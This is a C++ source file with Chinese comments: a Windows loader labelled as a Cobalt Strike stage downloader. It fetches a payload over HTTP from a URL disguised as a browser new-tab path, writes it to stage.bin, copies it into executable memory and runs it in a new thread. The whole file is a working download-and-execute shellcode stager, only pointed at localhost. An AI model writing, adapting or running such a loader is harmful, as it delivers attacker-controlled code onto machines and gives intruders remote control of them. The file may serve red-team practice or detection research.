// wininet下载stage.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

int main() {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dwSize = 0;
    BOOL bResults = FALSE;
    LPSTR pszOutBuffer;
    DWORD dwDownloaded = 0;
    const char* szUrl = "http://127.0.0.1/async/Newtab_promos";
    const char* szDomain = "127.0.0.1";
    const char* szUrlPath = "/async/Newtab_promos";
    const char* szFileName = "stage.bin";

    // 初始化 WinINet
    hInternet = InternetOpen("CobaltStrike Stage Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Failed to create WinINet session. Error %u\n", GetLastError());
        return 1;
    }

    // 连接目标主机
    hConnect = InternetConnect(hInternet, szDomain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) {
        printf("Failed to connect to server. Error %u\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 发送 HTTP 请求
    hRequest = HttpOpenRequest(hConnect, "GET", szUrlPath, NULL, NULL, NULL, 0, 0);
    if (hRequest == NULL) {
        printf("Failed to create HTTP request. Error %u\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 发送请求
    bResults = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
    if (!bResults) {
        printf("Failed to send HTTP request. Error %u\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    //InternetQueryDataAvailable的dwSize不对，不是完整文件大小
    DWORD dwContentSize = 0, dwIndex = 0, dwSizeDW = sizeof(DWORD);
    HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, (LPVOID)&dwContentSize, &dwSizeDW, &dwIndex);
    printf("http file size : %d\n", dwContentSize);
   //查询报头中的信息，文件长度。   
    //HTTP_QUERY_FLAG_NUMBER 参数必不可少 否则可能因为字符串编码问题接受不到正确的大小。
    //这是因为 HttpQueryInfoA() 函数返回的是 ASCII 编码的字符串，而不是数字。通过指定 HTTP_QUERY_FLAG_NUMBER 标志，将会返回以数字形式表示的内容长度。

    // 接收响应
    bResults = InternetQueryDataAvailable(hRequest, &dwSize, 0, 0);
    if (!bResults) {
        printf("Failed to query available data. Error %u\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    dwSize = dwContentSize;

    // 分配缓冲区并接收响应数据
    pszOutBuffer = (LPSTR)malloc(dwSize + 1);
    if (!pszOutBuffer) {
        printf("Failed to allocate memory for response buffer.\n");
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    ZeroMemory(pszOutBuffer, dwSize + 1);

    bResults = InternetReadFile(hRequest, pszOutBuffer, dwSize, &dwDownloaded);
    if (!bResults) {
        printf("Failed to read response data. Error %u\n", GetLastError());
        free(pszOutBuffer);
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 将响应数据保存到文件
    FILE *fp;
    fopen_s(&fp,szFileName, "wb");
    if (fp == NULL) {
        printf("Failed to create local file. Error %u\n", GetLastError());
        free(pszOutBuffer);
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    fwrite(pszOutBuffer, sizeof(char), dwDownloaded, fp);
    fclose(fp);

    // 清理资源
    free(pszOutBuffer);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    printf("Downloaded CobaltStrike Stage to %s.\n", szFileName);

    fopen_s(&fp, szFileName, "rb");
    LPVOID dllbuff = VirtualAlloc(0, dwContentSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    fread_s(dllbuff, dwContentSize, dwContentSize, 1, fp);
    HANDLE thba = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)dllbuff, 0, 0, 0);
    WaitForSingleObject(thba, -1);
    return 0;
}